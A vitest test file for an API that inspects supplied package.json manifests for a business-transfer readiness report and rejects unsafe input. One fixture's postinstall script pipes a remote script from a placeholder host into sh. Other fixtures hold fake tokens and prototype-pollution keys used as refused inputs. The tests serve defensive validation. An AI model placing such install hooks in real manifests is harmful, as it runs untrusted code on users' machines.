// Job 004a: bringing an existing product. Real API tests with fictional manifests. The inspector
// reads supplied text only: nothing is fetched, installed or run. Detection is a bounded name
// heuristic and is tested as one, not as proof of how a product is built.

import { rmSync } from "node:fs";
import { dirname, join } from "node:path";
import { fileURLToPath } from "node:url";
import { describe, expect, it } from "vitest";
import { everstreetApi } from "../src/app.ts";
import { openDb } from "../src/db.ts";
import { type ImportInspector, packageManifestInspector } from "../src/imports.ts";
import { Store } from "../src/store.ts";
import { gate, type Json } from "./deal-world.ts";

const NEXT_SAAS = {
  name: "ledgerline-app",
  version: "1.4.0",
  private: true,
  description: "Invoice cleanup for small accounting teams",
  license: "UNLICENSED",
  type: "module",
  engines: { node: ">=20" },
  packageManager: "pnpm@9.1.0",
  scripts: { dev: "next dev", postinstall: "curl https://scripts.example.invalid/x.sh | sh" },
  dependencies: {
    next: "14.2.3",
    react: "^18.3.1",
    "react-dom": "^18.3.1",
    "@prisma/client": "^5.14.0",
    "next-auth": "^4.24.7",
    openai: "^4.47.0",
  },
  devDependencies: { typescript: "^5.4.5", prisma: "^5.14.0", vercel: "^34.0.0" },
  repository: { type: "git", url: "https://code.example.invalid/ledgerline/app" },
};

const API_SERVICE = {
  name: "@ledgerline/api",
  version: "0.9.0",
  dependencies: {
    hono: "^4.0.0",
    pg: "^8.11.0",
    "@anthropic-ai/sdk": "^0.20.0",
    "near-api-js": "^4.0.0",
  },
  devDependencies: { vitest: "^1.6.0" },
};

const PLAIN = {
  name: "tiny-tool",
  version: "0.1.0",
  dependencies: {
    "left-pad": "^1.3.0",
    chalk: "5.3.0",
    shared: "workspace:*",
    local: "file:../local-lib",
    fork: "github:someone/forked-lib#main",
    tarball: "https://pkgs.example.invalid/pkg-1.0.0.tgz",
    renamed: "npm:other-lib@^2.0.0",
    nightly: "next",
    sshdep: "git+ssh://git@code.example.invalid/team/lib.git",
  },
};

const manifest = (o: unknown) => ({
  file_name: "package.json",
  content: JSON.stringify(o, null, 2),
});

function app(dbPath = ":memory:", importInspectors?: ImportInspector[]) {
  const store = new Store(openDb(dbPath));
  const api = everstreetApi(store, { localPreview: true, environment: "test", importInspectors });
  const as =
    (cookie: string) =>
    async (path: string, method = "GET", body?: unknown) => {
      const res = await api.request(path, {
        method,
        headers: { cookie, "content-type": "application/json" },
        body: body === undefined ? undefined : JSON.stringify(body),
      });
      const text = await res.text();
      return { status: res.status, body: (text ? JSON.parse(text) : {}) as Json, text };
    };
  const join = async (name: string) => {
    const res = await api.request("/api/session", {
      method: "POST",
      headers: { "content-type": "application/json" },
      body: JSON.stringify({ name }),
    });
    const cookie = (res.headers.get("set-cookie") ?? "").split(";")[0] ?? "";
    return Object.assign(as(cookie), {
      id: ((await res.json()) as Json).person.id as string,
      cookie,
    });
  };
  /** Moves control of a business, as a closed sale records it. */
  const transfer = (businessId: string, from: string, to: string) => {
    const gen = (
      store.db
        .prepare("SELECT COUNT(*) AS n FROM ownership WHERE business_id = ?")
        .get(businessId) as { n: number }
    ).n;
    store.db.prepare("UPDATE businesses SET owner_id = ? WHERE id = ?").run(to, businessId);
    store.db
      .prepare(
        "INSERT INTO ownership (business_id, from_id, to_id, generation, at) VALUES (?, ?, ?, ?, ?)",
      )
      .run(businessId, from, to, gen + 2, new Date().toISOString());
  };
  const count = (table: string) =>
    (store.db.prepare(`SELECT COUNT(*) AS n FROM ${table}`).get() as { n: number }).n;
  /** Every row of every table, as text, to prove what was never stored. */
  const dump = () =>
    (
      store.db.prepare("SELECT name FROM sqlite_master WHERE type = 'table'").all() as {
        name: string;
      }[]
    )
      .map((t) => JSON.stringify(store.db.prepare(`SELECT * FROM "${t.name}"`).all()))
      .join("\n");
  return { store, api, as, join, transfer, count, dump };
}

let keys = 0;
const key = () => `req-${++keys}`;

async function mara(w = app()) {
  const m = await w.join("Mara Solis");
  return { w, m };
}

const item = (view: Json, c: string) =>
  (view.report.live.items as Json[]).find((i) => i.category === c) as Json;

describe("004a inspecting a supplied package.json", () => {
  it("a Next.js SaaS manifest: normalized facts, labelled detections and a readiness report", async () => {
    const { w, m } = await mara();
    const r = await m("/api/imports", "POST", {
      idempotency_key: key(),
      new_business_name: "Ledgerline Labs",
      name: "Ledgerline",
      description: "Cleans invoice rows for small accounting teams",
      product_kind: "saas",
      manifest: manifest(NEXT_SAAS),
    });
    expect(r.status).toBe(201);
    const v = r.body;
    expect(v.workspace).toMatchObject({
      name: "Ledgerline",
      private: true,
      version: 1,
      product_kind: "saas",
    });
    expect(v.workspace.business).toMatchObject({ name: "Ledgerline Labs", published: false });
    const facts = v.source.latest.facts as Json;
    expect(facts.package).toMatchObject({
      name: "ledgerline-app",
      version: "1.4.0",
      private: true,
      license: "UNLICENSED",
      module_type: "module",
      node_engine: ">=20",
      package_manager: "pnpm@9.1.0",
      scripts_count: 2,
      repository_field: true,
    });
    expect(facts.counts.total).toBe(9);
    expect(facts.shape).toMatchObject({ guess: "web_app" });
    const labels = (facts.detections as Json[]).map((d) => `${d.category}:${d.label}`);
    for (const l of [
      "framework:Next.js",
      "framework:React",
      "tooling:TypeScript",
      "hosting:Vercel",
      "database:Prisma (ORM)",
      "model_provider:OpenAI",
      "authentication:Auth.js / NextAuth",
    ])
      expect(labels).toContain(l);
    expect((facts.detections as Json[]).find((d) => d.label === "Vercel")?.dev_only).toBe(true);
    // The report: detected items carry their evidence; nothing is ever verified.
    const report = v.report.live;
    // Hosting, database, model provider and sign-in are declared; no payment library is.
    expect(report.counts).toEqual({ verified: 0, detected: 4, declared: 0, unknown: 4 });
    expect(report.headline).toMatch(/^Not ready to transfer: nothing here is verified yet/);
    expect(report.next_action.category).toBe("source_ownership");
    expect(item(v, "hosting").evidence[0].text).toBe(
      "Detected in manifest: Vercel (vercel, development only)",
    );
    expect(item(v, "payments").status).toBe("unknown");
    expect(item(v, "customer_promises")).toMatchObject({
      status: "unknown",
      who: "The current owner, then the buyer",
    });
    expect(v.report.history).toHaveLength(1);
    expect(v.source.history[0]).toMatchObject({
      number: 1,
      inspector: "package-json",
      inspector_version: "1",
    });
    expect(v.source.latest.input_digest).toMatch(/^[0-9a-f]{64}$/);
    expect(v.scope).toMatch(/isn't fetched, installed or run/);
    // Scripts, the repository URL and the raw file are never stored, returned or logged.
    for (const secretish of [
      "scripts.example.invalid",
      "postinstall",
      "next dev",
      "code.example.invalid",
      '"scripts"',
    ]) {
      expect(r.text).not.toContain(secretish);
      expect(w.dump()).not.toContain(secretish);
    }
    // It belongs to the business: listed from the business and across the founder's imports.
    const listed = await m(`/api/businesses/${v.workspace.business.id}/imports`);
    expect(listed.body.imports).toHaveLength(1);
    expect(listed.body.imports[0]).toMatchObject({
      name: "Ledgerline",
      inspections: 1,
      unresolved: 8,
    });
  });

  it("an API service manifest and a plain one with unknown tooling", async () => {
    const { m } = await mara();
    const api = (
      await m("/api/imports", "POST", {
        idempotency_key: key(),
        new_business_name: "Ledgerline API",
        name: "Ledgerline API",
        product_kind: "api",
        manifest: manifest(API_SERVICE),
      })
    ).body;
    const f = api.source.latest.facts;
    expect(f.shape).toMatchObject({ guess: "api_service" });
    expect(item(api, "payments").evidence[0].text).toMatch(/NEAR libraries/);
    expect(item(api, "model_provider").evidence[0].text).toMatch(/Anthropic/);
    expect(item(api, "database").evidence[0].text).toMatch(/PostgreSQL/);
    expect((f.detections as Json[]).find((d) => d.label === "Test runner")).toMatchObject({
      dev_only: true,
    });

    const plain = (
      await m("/api/imports", "POST", {
        idempotency_key: key(),
        new_business_name: "Tiny Tool",
        name: "Tiny tool",
        manifest: manifest(PLAIN),
      })
    ).body;
    const p = plain.source.latest.facts;
    expect(p.detections).toEqual([]);
    expect(p.shape).toEqual({
      guess: "unknown",
      basis: "No framework this inspector recognizes is declared",
    });
    expect(plain.report.live.counts).toEqual({ verified: 0, detected: 0, declared: 0, unknown: 8 });
    const dep = (n: string) => (p.dependencies as Json[]).find((d) => d.name === n);
    expect(dep("left-pad")).toMatchObject({ ref_kind: "registry_range", ref: "^1.3.0" });
    expect(dep("chalk")).toMatchObject({ ref_kind: "registry_range", ref: "5.3.0" });
    expect(dep("shared")).toMatchObject({ ref_kind: "workspace", ref: "workspace:*" });
    expect(dep("local")).toMatchObject({ ref_kind: "file", ref: null });
    expect(dep("fork")).toMatchObject({ ref_kind: "git", ref: null });
    expect(dep("tarball")).toMatchObject({ ref_kind: "url", ref: null });
    expect(dep("renamed")).toMatchObject({ ref_kind: "alias", ref: "npm:other-lib@^2.0.0" });
    expect(dep("nightly")).toMatchObject({ ref_kind: "tag", ref: "next" });
    expect(dep("sshdep")).toMatchObject({ ref_kind: "git", ref: null });
    expect(JSON.stringify(plain)).not.toMatch(
      /pkgs\.example\.invalid|someone\/forked-lib|local-lib/,
    );
  });

  it("detection is a bounded heuristic: a dev-only framework is not the product's shape", async () => {
    const { m } = await mara();
    const v = (
      await m("/api/imports", "POST", {
        idempotency_key: key(),
        new_business_name: "Widget Kit",
        name: "Widget kit",
        manifest: manifest({
          name: "widget-kit",
          devDependencies: { react: "^18.0.0", stripe: "^15.0.0" },
        }),
      })
    ).body;
    expect(v.source.latest.facts.shape.guess).toBe("unknown");
    expect(item(v, "payments").evidence[0].text).toBe(
      "Detected in manifest: Stripe (stripe, development only)",
    );
    expect(item(v, "payments").next_step).toBe(
      "Confirm which account this is and who controls it.",
    );
  });
});

describe("004a refusing what must not be inspected or stored", () => {
  const create = (m: Awaited<ReturnType<typeof mara>>["m"], man: unknown) =>
    m("/api/imports", "POST", {
      idempotency_key: key(),
      new_business_name: "Probe Co",
      name: "Probe",
      manifest: man,
    });

  it("malformed, non-object, oversized, binary, other files and paths: refused, nothing created", async () => {
    const { w, m } = await mara();
    const before = [w.count("businesses"), w.count("import_workspaces"), w.count("events")];
    const cases: [unknown, number, RegExp][] = [
      [{ file_name: "package.json", content: "not json {" }, 400, /isn't valid JSON/],
      [{ file_name: "package.json", content: "[1, 2]" }, 400, /JSON object/],
      [{ file_name: "package.json", content: "null" }, 400, /JSON object/],
      [{ file_name: "package.json", content: "x".repeat(64 * 1024 + 1) }, 413, /64 KiB/],
      [{ file_name: "package.json", content: '{"name":"a\u0000b"}' }, 400, /binary/],
      [{ file_name: "index.js", content: "{}" }, 400, /Only a file named package.json/],
      [{ file_name: "../package.json", content: "{}" }, 400, /paths aren't accepted/],
      [{ file_name: "app/package.json", content: "{}" }, 400, /paths aren't accepted/],
      [{ file_name: "package.json", content: "" }, 400, /Supply the package.json/],
      [manifest({ dependencies: ["react"] }), 400, /must be an object/],
      [
        manifest({
          dependencies: Object.fromEntries(
            Array.from({ length: 301 }, (_, i) => [`p${i}`, "1.0.0"]),
          ),
        }),
        400,
        /more than 300/,
      ],
      [
        { file_name: "package.json", content: `${"[".repeat(20)}${"]".repeat(20)}` },
        400,
        /JSON object/,
      ],
      [
        manifest({ a: { b: { c: { d: { e: { f: { g: { h: { i: { j: 1 } } } } } } } } } }),
        400,
        /nested too deeply/,
      ],
    ];
    for (const [man, status, msg] of cases) {
      const r = await create(m, man);
      expect([r.status, r.body.error], JSON.stringify(man).slice(0, 60)).toEqual([
        status,
        expect.stringMatching(msg),
      ]);
    }
    expect([w.count("businesses"), w.count("import_workspaces"), w.count("events")]).toEqual(
      before,
    );
  });

  it("credential fields, secret-looking values and credential URLs: refused before saving, never echoed", async () => {
    const { w, m } = await mara();
    const secrets = [
      "npm_0123456789abcdefghijklmnopqrstuvwxyzAB",
      "ghp_abcdefghijklmnopqrstuvwxyz0123456789",
      "sk-proj-abcdefghijklmnopqrstuvwxyz012345",
      "hunter2-pass",
    ];
    const cases: [unknown, RegExp][] = [
      [{ name: "x", _authToken: secrets[0] }, /"_authToken" field, which holds credentials/],
      [{ name: "x", publishConfig: { _authToken: secrets[0] } }, /holds credentials/],
      [{ name: "x", config: { apiKey: "anything" } }, /holds credentials/],
      [{ name: "x", description: `token is ${secrets[1]}` }, /looks like a secret key or token/],
      [{ name: "x", dependencies: { client: secrets[2] } }, /looks like a secret key or token/],
      [
        {
          name: "x",
          dependencies: { lib: `git+https://deploy:${secrets[3]}@code.example.invalid/x.git` },
        },
        /URL with a user name or password/,
      ],
      [
        { name: "x", dependencies: { lib: "https://tokenuser@code.example.invalid/x.tgz" } },
        /URL with a user name or password/,
      ],
    ];
    for (const [o, msg] of cases) {
      const r = await create(m, manifest(o));
      expect([r.status, r.body.error]).toEqual([400, expect.stringMatching(msg)]);
      for (const s of secrets) expect(r.text).not.toContain(s);
    }
    const db = w.dump();
    for (const s of secrets) expect(db).not.toContain(s);
    expect(w.count("import_workspaces")).toBe(0);
  });

  it("prototype keys are refused; unusual names are normalized or skipped; nothing is polluted", async () => {
    const { m } = await mara();
    for (const raw of [
      '{"__proto__": {"polluted": true}}',
      '{"dependencies": {"constructor": "1.0.0"}}',
      '{"a": {"prototype": 1}}',
    ]) {
      const r = await create(m, { file_name: "package.json", content: raw });
      expect([r.status, r.body.error]).toEqual([400, expect.stringMatching(/isn't allowed/)]);
    }
    expect(({} as Json).polluted).toBeUndefined();
    const v = (
      await create(
        m,
        manifest({
          name: "Odd Name!",
          dependencies: {
            "Has Spaces": "1.0.0",
            "../evil": "1.0.0",
            UPPER: "1.0.0",
            "@scope/ok": "^1",
            n: 5,
          },
        }),
      )
    ).body;
    const f = v.source.latest.facts;
    expect(f.package.name).toBeNull();
    expect((f.dependencies as Json[]).map((d) => d.name).sort()).toEqual(["@scope/ok", "upper"]);
    expect(f.skipped.invalid_names).toBe(3);
    expect(JSON.stringify(v)).not.toContain("../evil");
  });
});

describe("004a1 concurrent writes and their answers", () => {
  it("writes to different rows all land, and every answer is an ordered snapshot the page can compare", async () => {
    const { m } = await mara();
    const v = (
      await m("/api/imports", "POST", {
        idempotency_key: key(),
        new_business_name: "Ledgerline Labs",
        name: "Ledgerline",
      })
    ).body;
    const id = v.workspace.id;
    const answers = await Promise.all([
      m(`/api/imports/${id}/dependencies/hosting`, "PUT", {
        version: 0,
        uses: true,
        note: "Vercel team",
      }),
      m(`/api/imports/${id}/dependencies/domain`, "PUT", { version: 0, uses: false }),
      m(`/api/imports/${id}`, "PATCH", { version: 1, name: "Ledgerline Pro" }),
      m(`/api/imports/${id}/inspections`, "POST", { idempotency_key: key(), ...manifest(PLAIN) }),
    ]);
    expect(answers.map((a) => a.status)).toEqual([200, 200, 200, 201]);
    const final = (await m(`/api/imports/${id}`)).body;
    expect(final.workspace).toMatchObject({ name: "Ledgerline Pro", version: 2 });
    expect(final.source.history).toHaveLength(1);
    const versions = (x: Json) => [
      x.workspace.version,
      ...(x.inventory as Json[]).map((i) => i.version),
      x.source.history.length,
      x.report.history.length,
    ];
    // Every answer is contained in the final state, and any two answers are ordered
    // counter by counter (never each newer than the other).
    for (const a of answers) {
      const va = versions(a.body);
      for (const [i, n] of versions(final).entries())
        expect(n).toBeGreaterThanOrEqual(va[i] as number);
      for (const b of answers) {
        const vb = versions(b.body);
        const up = va.some((n, i) => n > (vb[i] as number));
        const down = va.some((n, i) => n < (vb[i] as number));
        expect(up && down).toBe(false);
      }
    }
  });
});

describe("004a idempotent creation, versions and declarations", () => {
  it("a retried creation returns the same import and one business; a changed replay conflicts", async () => {
    const { w, m } = await mara();
    const body = {
      idempotency_key: "same-key",
      new_business_name: "Ledgerline Labs",
      name: "Ledgerline",
      manifest: manifest(NEXT_SAAS),
    };
    const businesses = w.count("businesses");
    const a = await m("/api/imports", "POST", body);
    const b = await m("/api/imports", "POST", body);
    expect([a.status, b.status]).toEqual([201, 200]);
    expect(b.body.workspace.id).toBe(a.body.workspace.id);
    expect(w.count("businesses")).toBe(businesses + 1);
    expect(w.count("import_inspections")).toBe(1);
    const changed = await m("/api/imports", "POST", { ...body, name: "Ledgerline 2" });
    expect([changed.status, changed.body.error]).toEqual([
      409,
      expect.stringMatching(/already used for a different import/),
    ]);
    const otherFile = await m("/api/imports", "POST", { ...body, manifest: manifest(PLAIN) });
    expect(otherFile.status).toBe(409);
    // A new inspection: replay is idempotent; the same key with another file conflicts.
    const id = a.body.workspace.id;
    const i1 = await m(`/api/imports/${id}/inspections`, "POST", {
      idempotency_key: "insp-1",
      ...manifest(API_SERVICE),
    });
    const i2 = await m(`/api/imports/${id}/inspections`, "POST", {
      idempotency_key: "insp-1",
      ...manifest(API_SERVICE),
    });
    const i3 = await m(`/api/imports/${id}/inspections`, "POST", {
      idempotency_key: "insp-1",
      ...manifest(PLAIN),
    });
    expect([i1.status, i2.status, i3.status]).toEqual([201, 200, 409]);
    expect(w.count("import_inspections")).toBe(2);
    // Snapshots are immutable even to the database's own writers.
    expect(() => w.store.db.prepare("UPDATE import_inspections SET facts = '{}'").run()).toThrow(
      /immutable/,
    );
    expect(() => w.store.db.prepare("DELETE FROM import_reports").run()).toThrow(/immutable/);
  });

  it("edits and declarations use optimistic versions; statements never become verified", async () => {
    const { m } = await mara();
    const v = (
      await m("/api/imports", "POST", {
        idempotency_key: key(),
        new_business_name: "Ledgerline Labs",
        name: "Ledgerline",
        manifest: manifest(NEXT_SAAS),
      })
    ).body;
    const id = v.workspace.id;
    const e1 = await m(`/api/imports/${id}`, "PATCH", {
      version: 1,
      description: "Invoice rows, cleaned",
      product_kind: "ai_tool",
    });
    expect([e1.status, e1.body.workspace.version, e1.body.workspace.description]).toEqual([
      200,
      2,
      "Invoice rows, cleaned",
    ]);
    const stale = await m(`/api/imports/${id}`, "PATCH", { version: 1, name: "Overwritten" });
    expect([stale.status, stale.body.error]).toEqual([
      409,
      expect.stringMatching(/Nothing was overwritten/),
    ]);
    expect(
      (await m(`/api/imports/${id}`, "PATCH", { version: 2, product_kind: "spaceship" })).status,
    ).toBe(400);

    const put = (c: string, b: Json) => m(`/api/imports/${id}/dependencies/${c}`, "PUT", b);
    const d1 = await put("source_ownership", {
      version: 0,
      uses: true,
      note: "Private repository on Mara's company account",
    });
    expect(d1.status).toBe(200);
    expect(item(d1.body, "source_ownership")).toMatchObject({ status: "declared" });
    expect(item(d1.body, "source_ownership").evidence[0].text).toBe(
      "You said: Private repository on Mara's company account",
    );
    expect((await put("source_ownership", { version: 0, uses: false })).status).toBe(409);
    expect(
      (await put("hosting", { version: 0, uses: true, status: "verified", note: "x" })).status,
    ).toBe(400);
    expect((await put("hosting", { version: 0, verified: true })).status).toBe(400);
    expect((await put("hosting", { version: 0, uses: true })).body.error).toMatch(
      /Say what is used/,
    );
    expect(
      (
        await put("hosting", {
          version: 0,
          uses: true,
          note: "key sk-proj-abcdefghijklmnopqrstuvwxyz012345",
        })
      ).status,
    ).toBe(400);
    expect((await put("nonsense", { version: 0, uses: false })).status).toBe(404);
    // Detected plus declared stays "detected": a statement adds evidence, not verification.
    const d2 = await put("hosting", {
      version: 0,
      uses: true,
      note: "Vercel team owned by Ledgerline Labs",
    });
    expect(item(d2.body, "hosting").status).toBe("detected");
    expect(item(d2.body, "hosting").evidence.map((e: Json) => e.kind)).toEqual([
      "detected",
      "declared",
    ]);
    let last = d2.body;
    for (const c of [
      "database",
      "model_provider",
      "authentication",
      "payments",
      "domain",
      "customer_promises",
    ])
      last = (await put(c, { version: 0, uses: false, note: "" })).body;
    expect(last.report.live.counts.verified).toBe(0);
    expect(last.report.live.headline).toMatch(/^Not ready to transfer/);
    expect(last.report.live.next_action.category).toBeNull();
    // Clearing a statement returns the item to unknown.
    const cleared = await put("domain", { version: 1, uses: null });
    expect(item(cleared.body, "domain").status).toBe("unknown");
  });
});

describe("004a access, ownership and disclosure", () => {
  /** The real inspector, which can be armed to hold its next inspection until released. */
  function holdable() {
    let held: { release: ReturnType<typeof gate>; entered: ReturnType<typeof gate> } | null = null;
    const inspector: ImportInspector = {
      ...packageManifestInspector,
      inspect: async (input) => {
        const h = held;
        held = null;
        if (h) {
          h.entered.open();
          await h.release.opened;
        }
        return packageManifestInspector.inspect(input);
      },
    };
    const arm = () => {
      const h = { release: gate(), entered: gate() };
      held = h;
      return h;
    };
    return { inspector, arm };
  }

  async function withImport(inspector?: ImportInspector) {
    const w = app(":memory:", inspector ? [inspector] : undefined);
    const m = await w.join("Mara Solis");
    const ana = await w.join("Ana Ruiz");
    return { w, m, ana };
  }

  it("ownership changing while an inspection runs: nothing is saved (former owner 404, away-and-back 409)", async () => {
    const h = holdable();
    const { w, m, ana } = await withImport(h.inspector);
    const v = (
      await m("/api/imports", "POST", {
        idempotency_key: key(),
        new_business_name: "Ledgerline Labs",
        name: "Ledgerline",
      })
    ).body;
    const id = v.workspace.id as string;
    const bid = v.workspace.business.id as string;
    const inspect = () =>
      m(`/api/imports/${id}/inspections`, "POST", {
        idempotency_key: key(),
        ...manifest(NEXT_SAAS),
      });

    // Control moves to Ana while the inspection is held: the former owner's result is dropped.
    let gateNow = h.arm();
    let pending = inspect();
    await gateNow.entered.opened;
    w.transfer(bid, m.id, ana.id);
    gateNow.release.open();
    expect((await pending).status).toBe(404);
    expect(w.count("import_inspections")).toBe(0);

    // Away and back while held: the generation changed, so nothing is saved either.
    w.transfer(bid, ana.id, m.id);
    gateNow = h.arm();
    pending = inspect();
    await gateNow.entered.opened;
    w.transfer(bid, m.id, ana.id);
    w.transfer(bid, ana.id, m.id);
    gateNow.release.open();
    const raced = await pending;
    expect([raced.status, raced.body.error]).toEqual([
      409,
      expect.stringMatching(/Control of this business changed/),
    ]);
    expect(w.count("import_inspections")).toBe(0);

    // Unheld, it works: the fences are about the change, not about inspecting.
    expect((await inspect()).status).toBe(201);
    expect(w.count("import_inspections")).toBe(1);

    // Creating into an existing business is fenced the same way.
    const workspaces = w.count("import_workspaces");
    gateNow = h.arm();
    const creating = m("/api/imports", "POST", {
      idempotency_key: key(),
      business_id: bid,
      name: "Second product",
      manifest: manifest(PLAIN),
    });
    await gateNow.entered.opened;
    w.transfer(bid, m.id, ana.id);
    gateNow.release.open();
    expect((await creating).status).toBe(404);
    expect(w.count("import_workspaces")).toBe(workspaces);
  });

  it("a new owner gets the import with the business; the former owner and others get 404", async () => {
    const { w, m, ana } = await withImport();
    const lee = await w.join("Lee Park");
    const v = (
      await m("/api/imports", "POST", {
        idempotency_key: key(),
        new_business_name: "Ledgerline Labs",
        name: "Ledgerline",
        manifest: manifest(NEXT_SAAS),
      })
    ).body;
    const id = v.workspace.id;
    const bid = v.workspace.business.id;
    expect((await lee(`/api/imports/${id}`)).status).toBe(404);
    expect((await lee(`/api/businesses/${bid}/imports`)).status).toBe(404);
    expect((await lee("/api/imports")).body.imports).toEqual([]);
    expect((await lee(`/api/imports/${id}/inspections/1`)).status).toBe(404);
    expect(
      (await lee(`/api/imports/${id}/dependencies/hosting`, "PUT", { version: 0, uses: false }))
        .status,
    ).toBe(404);
    w.transfer(bid, m.id, ana.id);
    const theirs = await ana(`/api/imports/${id}`);
    expect(theirs.status).toBe(200);
    expect(theirs.body.workspace.owner_epoch).toBe(`${ana.id}:1`);
    expect(theirs.body.source.latest.facts.package.name).toBe("ledgerline-app");
    expect((await m(`/api/imports/${id}`)).status).toBe(404);
    expect((await m("/api/imports")).body.imports).toEqual([]);
    expect((await m(`/api/imports/${id}`, "PATCH", { version: 1, name: "Mine" })).status).toBe(404);
    expect(
      (await ana(`/api/imports/${id}`, "PATCH", { version: 1, name: "Ledgerline (acquired)" }))
        .status,
    ).toBe(200);
  });

  it("nothing about an import appears on public pages, discovery or search", async () => {
    const { m } = await withImport();
    const p = (await m("/api/projects", "POST", { route: "started", name: "Ledgerline Labs" }))
      .body;
    const bid = p.business.id as string;
    await m(`/api/projects/${p.id}/answers`, "PATCH", {
      audience: "Small accounting teams",
      outcome: "Clean invoice rows",
      deliverable: "An API call",
      price: "$35",
      when: "Any time",
      where: "Online",
      capacity: "100",
      confirmed: true,
    });
    expect((await m(`/api/businesses/${bid}/publish`, "POST")).status).toBe(200);
    await m("/api/imports", "POST", {
      idempotency_key: key(),
      business_id: bid,
      name: "Quietcatalog",
      description: "Zebrafinch private import description",
      manifest: manifest({ ...NEXT_SAAS, name: "zebrafinch-internal" }),
    });
    const pages = [
      await m(`/api/public/businesses/${p.business.slug}`),
      await m("/api/public/discover"),
      await m("/api/public/search?q=Zebrafinch"),
      await m("/api/public/search?q=zebrafinch-internal"),
      await m("/api/public/explore"),
    ];
    for (const page of pages) {
      expect(page.text).not.toMatch(/Zebrafinch|zebrafinch-internal|Quietcatalog|next-auth/);
    }
    expect(pages[0]?.status).toBe(200);
  });
});

describe("004a persistence across a restart", () => {
  it("normalized facts, statements and report history survive; a new manifest changes the facts", async () => {
    // A throwaway file next to this test (*.db is ignored by git), removed afterwards.
    const path = join(
      dirname(fileURLToPath(import.meta.url)),
      `import-restart-${process.pid}-${Date.now()}.db`,
    );
    try {
      const first = app(path);
      const m = await first.join("Mara Solis");
      const v = (
        await m("/api/imports", "POST", {
          idempotency_key: key(),
          new_business_name: "Ledgerline Labs",
          name: "Ledgerline",
          manifest: manifest(NEXT_SAAS),
        })
      ).body;
      const id = v.workspace.id;
      await m(`/api/imports/${id}/dependencies/domain`, "PUT", {
        version: 0,
        uses: true,
        note: "ledgerline.example, Mara's registrar account",
      });
      first.store.db.close();

      // A new process: same database file, same session cookie.
      const second = app(path);
      const again = second.as(m.cookie);
      const reopened = (await again(`/api/imports/${id}`)).body;
      expect(reopened.source.latest.facts.package.name).toBe("ledgerline-app");
      expect(item(reopened, "domain").evidence[0].text).toBe(
        "You said: ledgerline.example, Mara's registrar account",
      );
      expect(item(reopened, "payments").status).toBe("unknown");
      // An updated manifest adds Stripe: the facts and the readiness item change.
      const withStripe = {
        ...NEXT_SAAS,
        dependencies: { ...NEXT_SAAS.dependencies, stripe: "^15.0.0" },
      };
      const updated = (
        await again(`/api/imports/${id}/inspections`, "POST", {
          idempotency_key: key(),
          ...manifest(withStripe),
        })
      ).body;
      expect(item(updated, "payments")).toMatchObject({ status: "detected" });
      expect(updated.report.live.counts.detected).toBe(5);
      expect(updated.report.history.map((h: Json) => h.number)).toEqual([2, 1]);
      // The first report is unchanged: payments was unknown then.
      const old = (await again(`/api/imports/${id}/reports/1`)).body;
      expect((old.report.items as Json[]).find((i) => i.category === "payments")?.status).toBe(
        "unknown",
      );
      expect(old.report.counts.detected).toBe(4);
      const oldFacts = (await again(`/api/imports/${id}/inspections/1`)).body;
      expect((oldFacts.facts.dependencies as Json[]).some((d) => d.name === "stripe")).toBe(false);
      expect((await again(`/api/imports/${id}/reports/9`)).status).toBe(404);
      second.store.db.close();
    } finally {
      for (const suffix of ["", "-wal", "-shm"]) rmSync(`${path}${suffix}`, { force: true });
    }
  });
});
